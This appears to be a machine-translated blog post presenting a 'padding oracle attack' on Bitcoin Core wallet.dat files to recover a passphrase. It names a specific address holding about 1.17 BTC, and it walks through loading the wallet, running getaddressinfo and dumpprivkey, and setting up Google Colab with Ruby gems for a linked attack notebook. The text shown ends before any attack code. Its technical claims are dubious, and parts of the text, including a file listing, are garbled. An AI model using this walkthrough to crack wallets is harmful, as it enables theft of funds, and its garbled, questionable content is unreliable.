# Padding Oracle Attack 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/0aCfT-kCRlw?si=57ZypzMlWiJwy2Zi" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://capec.mitre.org/data/definitions/463.html" target="_blank" rel="noreferrer noopener">在本文中，我們將使用網路安全資源[CAPEC™]</a>中的常見攻擊模式分類。<a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">「Padding Oracle Attack」</a>最早於 2012 年在<a href="https://en.bitcoin.it/wiki/Wallet" target="_blank" rel="noreferrer noopener">Wallet.dat上討論</a><em>（在漏洞管理和威脅分析平台<a href="https://github.com/vuldb" target="_blank" rel="noreferrer noopener"><strong>「VulDB」</strong></a>上）</em>。<strong><a href="https://github.com/bitcoin/bitcoin" target="_blank" rel="noreferrer noopener">最受歡迎的Bitcoin Core</a></strong>錢包的問題影響了<strong><code>AES Encryption Padding</code></strong>文件中的&nbsp;工作&nbsp;<strong><code>Wallet.dat</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>此攻擊的技術細節已知：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4104,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-71-1024x250.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4104"/><figcaption class="wp-element-caption"><a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" target="_blank" rel="noreferrer noopener">https://en.wikipedia.org/wiki/Padding_oracle_attack</a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>如果目標系統洩漏了解密密文時是否發生填充錯誤的訊息，攻擊者可以在不知道解密金鑰的情況下有效解密資料。&nbsp;傳輸此類資訊的目標系統成為填充預言機，攻擊者可以使用該預言機在不知道解密金鑰的情況下有效地解密數據，向填充預言機發出平均調用次數（其中 是<code>128*b</code>密<code>b</code>文區塊）。&nbsp;除了執行解密之外，攻擊者還可以使用填充預言機來建立有效的密文（即執行加密），而所有這些都無需知道加密金鑰。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4107} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-72.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4107"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>如果加密訊息在解密前未經過身份驗證以確保其有效性，則任何密碼系統都可能容易受到填充預言機攻擊，然後將填充錯誤訊息傳遞給攻擊者。&nbsp;例如，這種攻擊方法可用於破壞驗證碼系統或解密/修改儲存在用戶端物件（例如隱藏欄位或 cookie）中的狀態資訊。&nbsp;</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4110} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-75.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4110"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>這種攻擊方法是對密碼系統的旁道攻擊，利用執行不力的解密過程中洩漏的資料來徹底破壞密碼系統。告訴攻擊者在解密過程中是否發生填充錯誤的單一訊息，無論其形式為何，都足以讓攻擊者破解密碼系統。這些資訊可能以明確完成錯誤訊息、返回空白頁、甚至伺服器需要更長的時間來回應（定時攻擊）的形式出現。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4111} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-76.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4111"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>這種攻擊可以跨域模式發起，攻擊者可以利用跨域資訊洩漏從與受害者互動的目標系統/服務的填充預言中獲取少量資訊。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4112} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-77.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4112"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>在對稱加密中，填充預言機攻擊可以在 AES-256-CBC 加密模式（比特幣核心使用）中執行，其中「預言機」（來源）通訊加密訊息的填充是否正確或是否正確。不是。&nbsp;<strong>此類資料可能允許攻擊者在不知道加密金鑰的情況下</strong>使用預言機金鑰透過預言機解密訊息&nbsp;。<strong></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4117} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-78-1024x396.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4117"/><figcaption class="wp-element-caption">填入 Wallet.dat 上的 Oracle 攻擊流程</figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>讓我們進入實際部分，透過漏洞執行一系列操作，以便在此過程中填寫Wallet.dat檔案中的oracle並最終找到我們需要的二進位格式的密碼。</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4122} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-79.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4122"/><figcaption class="wp-element-caption"><code>Capture The Flag (CTF)</code></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>早些時候，研究人員和錦標賽參與者<code>CTF</code>公開了被駭的 [&nbsp;<a href="https://github.com/demining/CryptoDeepTools/raw/29bf95739c7b7464beaeb51803d4d2e1605ce954/27PaddingOracleAttackonWalletdat/wallet.dat" target="_blank" rel="noreferrer noopener">wallet.dat&nbsp;<em>2023</em></a>&nbsp;] 比特幣錢包：<strong><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></strong>，金額為<em>：&nbsp;</em><strong><code><strong><code>44502.42</code></strong></code>&nbsp;美元 // 比特幣：&nbsp;<code>1.17<strong>461256</strong>&nbsp;BTC</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4134,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-80.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4134"/><figcaption class="wp-element-caption"><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://github.com/bitcoin/bitcoin/releases" target="_blank" rel="noreferrer noopener">讓我們點擊比特幣核心版本 22.1</a>的鏈接<code>releases</code><a href="https://github.com/bitcoin/bitcoin/releases" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4138,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/bitcoin/bitcoin/releases" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-81-1024x507.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4138"/></a><figcaption class="wp-element-caption">https://github.com/bitcoin/bitcoin/releases</figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading">索引 /bin/bitcoin-core-22.1/</h1>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://bitcoincore.org/bin/">../ </a><a href="https://bitcoincore.org/bin/bitcoin-core-22.1/test.rc1/">test.rc1/</a> 2022 年 11 月 8 日 18:08 - <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/test.rc2/">test.rc2/</a> 2022 年 11 月 28 日 09:39 - <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/SHA256SUMS">SHA256SUMS</a> 2022 年 12 月 14 日 17:59 2353 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/SHA256SUMS.asc">1256</a> 月日17:59 10714 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/SHA256SUMS.ots">SHA256SUMS.ots</a> 2022 年 12 月 14 日 17:59 538 比特 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-aarch64-linux-gnu.tar.gz">幣-22.1-aarch64-linux-gnu.tar.gz</a> 2022 年 12 月 14 日 17:59 3456476-45034 比特 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-arm-linux-gnueabihf.tar.gz">幣-gnueabihf.tar.gz</a> 14- 2022 年 12 月 18:00 30424198 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-osx-signed.dmg">比特幣-22.1-osx-signed.dmg</a> 2022 年 12 月 14 日 18:00 14838454 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-osx64.tar.gz">比特幣-21</a> . 14 日18:00 27930578 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-powerpc64-linux-gnu.tar.gz">比特幣-22.1-powerpc64-linux -gnu.tar.gz</a> 2022 年12月14日18:00 3999102 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-powerpc64le-linux-gnu.tar.gz">比特幣-22.1-powerpc64le-linux-gnu.tar.gz</a> 18:00 38867643 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-riscv64-linux-gnu.tar.gz">比特幣-22.1-riscv64-linux-gnu.tar.gz</a> 2022 年 12 月 14 日 18:01 34114511 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-win64-setup.exe">比特幣-22.1-win64-setup.exe1 34114511比特幣-22.1-win64-setup.exe 2022 年 18 月</a><a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-win64.zip">-22.1-win64.zip</a> 2022 年 12 月 14 日 18:01 34263968 比特 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-x86_64-linux-gnu.tar.gz">幣-22.1-x86_64-linux -gnu.tar.gz</a> 2022年12月14日18:01 35964880 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1.tar.gz">.</a> 12月14日18:01 8122372 比特幣 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1.torrent">-22.1.torrent</a> 2022年12月14日18:01 49857</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">安裝<a href="https://github.com/bitcoin/bitcoin/releases" target="_blank" rel="noreferrer noopener">比特幣核心版本 22.1</a></h2>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/doc/walletdatgif.gif" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">一定！重啟QT程式 // 重啟比特幣核心</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>按鍵：<strong><code>Ctrl + Q</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>您需要重新啟動程式<code><strong>QT</strong></code>才能同步新的<code><strong>wallet.dat</strong></code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/doc/walletdatgif01.gif" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">讓我們使用 getaddressinfo 指令檢查比特幣錢包：&nbsp;&nbsp;<strong><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></strong>&nbsp;</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>getaddressinfo "address"

Return information about the given bitcoin address.
Some of the information will only be present if the address is in the active wallet.
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>讓我們運行命令：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>getaddressinfo 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b </code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>結果：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>{
  "address": "1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b",
  "scriptPubKey": "76a9147774801e52a110aba2d65ecc58daf0cfec95a09f88ac",
  "ismine": true,
  "solvable": true,
  "desc": "pkh(&#91;7774801e]02ad103ef184f77ab673566956d98f78b491f3d67edc6b77b2d0dfe3e41db5872f)#qzqmjdel",
  "iswatchonly": false,
  "isscript": false,
  "iswitness": false,
  "pubkey": "02ad103ef184f77ab673566956d98f78b491f3d67edc6b77b2d0dfe3e41db5872f",
  "iscompressed": true,
  "ischange": false,
  "timestamp": 1,
  "labels": &#91;
    ""
  ]
}</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/doc/walletdatgif02.gif" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">讓我們執行 dumpprivkey 指令來取得比特幣錢包的私鑰：&nbsp;&nbsp;<strong><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></strong>&nbsp;</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>dumpprivkey "address"

Reveals the private key corresponding to 'address'.
Then the importprivkey can be used with this output</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>讓我們運行命令：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>dumpprivkey 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b
</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>結果：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Error: Please enter the wallet passphrase with walletpassphrase first. (code -13)</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/doc/walletdatgif03.gif" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">我們看到對比特幣錢包</a>私鑰的存取&nbsp;受到密碼保護。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>passphrase ?!?!?
passphrase ?!?!?
passphrase ?!?!?</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>讓我們運行並將密碼解密為二進位格式，為此我們需要安裝<strong><a href="https://github.com/bitcoin/bitcoin.git">比特幣核心整合/暫存樹</a></strong><code><strong>Padding Oracle Attack на Wallet.dat</strong></code>儲存庫；為此您可以從<strong><a href="https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt" target="_blank" rel="noreferrer noopener">Jupyter Notebook&nbsp;</a></strong>開啟完成的檔案&nbsp;並將其上傳到<strong><a href="https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt" target="_blank" rel="noreferrer noopener">&nbsp;Google Colab&nbsp;</a></strong>筆記本）<strong><a href="https://github.com/bitcoin/bitcoin.git"></a></strong><strong><a href="https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt" target="_blank" rel="noreferrer noopener"></a></strong><strong><a href="https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":3896,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-29-1024x164.png" alt="Libbitcoin Explorer 3.x庫中的Milk Sad漏洞，如何從比特幣錢包（BTC）用戶竊取90萬美元" class="wp-image-3896"/></a><figcaption class="wp-element-caption"><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat">ht&nbsp;</a><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat" target="_blank" rel="noreferrer noopener">tps://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat</a></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Padding_Oracle_Attack_on_Wallet_dat.ipynb</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>讓我們使用連結開啟<a href="https://colab.research.google.com/" target="_blank" rel="noreferrer noopener">Google Colab</a>服務：https:&nbsp;<a href="https://colab.research.google.com/" target="_blank" rel="noreferrer noopener">//colab.research.google.com</a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":3735} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-11.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-3735"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>點擊“<strong><code>"+"</code></strong>建立<em><strong>新記事本”</strong></em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":3738} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-12.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-3738"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">在 Google Colab 中安裝 Ruby</h2>
<!-- /wp:heading -->

<!-- wp:image {"id":3740} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-13-1024x487.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-3740"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>為了運行我們需要的程序，我們將安裝物件導向的程式語言<a href="https://www.ruby-lang.org/" target="_blank" rel="noreferrer noopener"><strong>Ruby</strong></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!sudo apt install ruby-full</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4167} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-82-1024x750.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4167"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>我們來檢查安裝版本</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!ruby --version</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":3747} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-15.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-3747"/><figcaption class="wp-element-caption">Ruby 版本 3.0.2p107（2021-07-07 修訂版 0db68f0233）[x86_64-linux-gnu]</figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>讓我們安裝一個<code>'bitcoin-ruby'</code>與比特幣協議/網路互動的庫</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!gem install bitcoin-ruby</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4168} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-83-1024x674.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4168"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>讓我們安裝一個<code>'ecdsa'</code>用於實現橢圓曲線數位簽章演算法（ECDSA）的庫</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!gem install ecdsa</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4169} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-84-1024x384.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4169"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>讓我們安裝一個函式庫來相互<code>'base58'</code>轉換整數或二進制數。<code>base58</code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!gem install base58</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4171} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-85.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4171"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>讓我們安裝一個函式庫<code>'crypto'</code>來簡化位元組操作和基本加密操作</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!gem install crypto</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4172} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-86-1024x390.png" alt="Padding Oracle 對流行的 Bitcoin Core 錢包的 Wallet.dat 密碼解密的攻擊" class="wp-image-4172"/></figure>
